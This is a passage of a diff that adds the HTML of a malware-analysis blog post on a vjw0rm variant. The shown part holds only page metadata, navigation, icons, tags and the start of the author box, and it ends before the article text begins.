@@ -1,0 +1,1938 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Starting Small: Analysis of recent vjw0rm variant &middot; Malware Analysis: Or How I Learned To Love Frustration</title>
+  <meta name="title" content="Starting Small: Analysis of recent vjw0rm variant &middot; Malware Analysis: Or How I Learned To Love Frustration" />
+  
+  <meta name="description" content="Analysis of a recent variant of vjw0rm. I walk through my approach to analysing the sample, the challenges I faced in completing the task, resources I leveraged to overcome these and finally the lessons I learned along the way." />
+  <meta name="keywords" content="vjw0rm, Reverse, Engineering, JavaScript, eCrime, " />
+  
+  
+  <link rel="canonical" href="https://polaryse.github.io/blog-posts/vjw0rm/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.145d78b5c0fe58aedb5cab338cf11b8e28b3e3468ceef2a1ab7988b10d699e53caf2fd590daa90c0a2c685727a1fbc4feb8e1af0ccdb17926d3ade03fba2af77.css"
+    integrity="sha512-FF14tcD&#43;WK7bXKszjPEbjiiz40aM7vKhq3mIsQ1pnlPK8v1ZDaqQwKLGhXJ6H7xP644a8MzbF5JtOt4D&#43;6Kvdw==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.1271c22a557a15f10b5d38d2c87e49503604cfeffebadc1e7c267934e4b9f3ba1b74d81371219f9681dab2141482fc4ed2a8b462b179f0ef43a5f76d0575e85b.js"
+    integrity="sha512-EnHCKlV6FfELXTjSyH5JUDYEz&#43;/&#43;utwefCZ5NOS587obdNgTcSGfloHashQUgvxO0qi0YrF58O9DpfdtBXXoWw==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Starting Small: Analysis of recent vjw0rm variant" />
+<meta property="og:description" content="Analysis of a recent variant of vjw0rm. I walk through my approach to analysing the sample, the challenges I faced in completing the task, resources I leveraged to overcome these and finally the lessons I learned along the way." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://polaryse.github.io/blog-posts/vjw0rm/" /><meta property="og:image" content="https://polaryse.github.io/blog-posts/vjw0rm/featured.png" /><meta property="article:section" content="Blog Posts" />
+<meta property="article:published_time" content="2022-11-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-29T00:00:00+00:00" />
+
+
+
+  <meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://polaryse.github.io/blog-posts/vjw0rm/featured.png" /><meta name="twitter:title" content="Starting Small: Analysis of recent vjw0rm variant"/>
+<meta name="twitter:description" content="Analysis of a recent variant of vjw0rm. I walk through my approach to analysing the sample, the challenges I faced in completing the task, resources I leveraged to overcome these and finally the lessons I learned along the way."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog Posts",
+    "name": "Starting Small: Analysis of recent vjw0rm variant",
+    "headline": "Starting Small: Analysis of recent vjw0rm variant",
+    
+    "abstract": "Analysis of a recent variant of vjw0rm. I walk through my approach to analysing the sample, the challenges I faced in completing the task, resources I leveraged to overcome these and finally the lessons I learned along the way.",
+    "inLanguage": "en",
+    "url" : "https:\/\/polaryse.github.io\/blog-posts\/vjw0rm\/",
+    "author" : {
+      "@type": "Person",
+      "name": "polaryse"
+    },
+    "copyrightYear": "2022",
+    "dateCreated": "2022-11-29T00:00:00\u002b00:00",
+    "datePublished": "2022-11-29T00:00:00\u002b00:00",
+    
+    "dateModified": "2022-11-29T00:00:00\u002b00:00",
+    
+    "keywords": ["vjw0rm","Reverse","Engineering","JavaScript","eCrime"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3669"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="polaryse" />
+  
+  
+  
+  <link href="https://twitter.com/p0laryse" rel="me" />
+  
+  
+  <link href="https://infosec.exchange/@polaryse" rel="me" />
+  
+  
+  <link href="https://github.com/polaryse" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+  
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+  <script>
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAVpLNVJvJI978eeofu9QtYDloSDZ5HKiY",
+      authDomain: "AIzaSyAVpLNVJvJI978eeofu9QtYDloSDZ5HKiY",
+      projectId: "polaryse-e5ded",
+      storageBucket: "polaryse-e5ded.appspot.com",
+      messagingSenderId: "196688950789",
+      appId: "1:196688950789:web:daa0043ca3d82b21b34e6c",
+      measurementId: "G-NP66FV21FJ"
+    };
+
+    var app = firebase.initializeApp(firebaseConfig);
+    var db = firebase.firestore();
+    var auth = firebase.auth();
+
+  </script>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Malware Analysis: Or How I Learned To Love Frustration</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href=""  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Blog
+    </p>
+</a>
+
+
+            
+            
+  <a href=""  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Training Courses
+    </p>
+</a>
+
+
+            
+            
+  <a href="/ctfs/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="CTFs">
+        CTF Challenges
+    </p>
+</a>
+
+
+            
+            
+  <a href="https://github.com/polaryse"  target="_blank"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Github
+    </p>
+</a>
+
+
+            
+            
+  <a href="https://infosec.exchange/@polaryse"  target="_blank"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Mastodon
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400 h-12"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href=""  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Blog
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href=""  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Training Courses
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/ctfs/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="CTFs">
+            CTF Challenges
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="https://github.com/polaryse"  target="_blank"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Github
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="https://infosec.exchange/@polaryse"  target="_blank"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Mastodon
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/blog-posts/vjw0rm/featured_hu1e084923b660c0bd2b10e0b6ab092420_635508_1200x0_resize_box_3.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Starting Small: Analysis of recent vjw0rm variant
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <span>3669 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">18 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
+    
+    <span id="views_Blog Posts/vjw0rm/index.md" 
+    
+        class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title="views">loading</span> 
+    <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
+<path fill="currentColor" d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
+  </span>
+
+</span>
+</span><span class="px-2 text-primary-500">&middot;</span><span>
+    
+    <span id="likes_Blog Posts/vjw0rm/index.md" 
+    
+        class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title="likes">loading</span> 
+    <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
+  </span>
+
+</span>
+</span><span class="px-2 text-primary-500">&middot;</span><span>
+    <button id="button_likes"
+        class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+        onclick="process_article()">
+        <span id="button_likes_heart" style="display:none" class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
+  </span>
+
+ </span>
+        <span id="button_likes_emtpty_heart" class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+<path fill="currentColor" d="M244 84L255.1 96L267.1 84.02C300.6 51.37 347 36.51 392.6 44.1C461.5 55.58 512 115.2 512 185.1V190.9C512 232.4 494.8 272.1 464.4 300.4L283.7 469.1C276.2 476.1 266.3 480 256 480C245.7 480 235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1 0 232.4 0 190.9V185.1C0 115.2 50.52 55.58 119.4 44.1C164.1 36.51 211.4 51.37 244 84C243.1 84 244 84.01 244 84L244 84zM255.1 163.9L210.1 117.1C188.4 96.28 157.6 86.4 127.3 91.44C81.55 99.07 48 138.7 48 185.1V190.9C48 219.1 59.71 246.1 80.34 265.3L256 429.3L431.7 265.3C452.3 246.1 464 219.1 464 190.9V185.1C464 138.7 430.4 99.07 384.7 91.44C354.4 86.4 323.6 96.28 301.9 117.1L255.1 163.9z"/></svg>
+  </span>
+
+</span>
+        <span id="button_likes_text">&nbsp;Like</span>
+    </button>
+</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/vjw0rm/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    vjw0rm
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/reverse/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Reverse
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/engineering/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Engineering
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/javascript/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    JavaScript
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ecrime/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    eCrime
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+      
+      
+<div class="flex author">
+  
+  
+  
+  
+  
+  
+  <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+    alt="polaryse" src="/author_hu60a6ef9a1dfe976efadd873b0b5859d3_73965_192x192_fill_box_smart1_3.png" />
+  
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      polaryse
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">A Malware Analyst documenting their exploration of the wonderful world of malware.</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://twitter.com/p0laryse"
+          target="_blank"
+          aria-label="Twitter"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://infosec.exchange/@polaryse"
+          target="_blank"
+          aria-label="Mastodon"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/polaryse"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
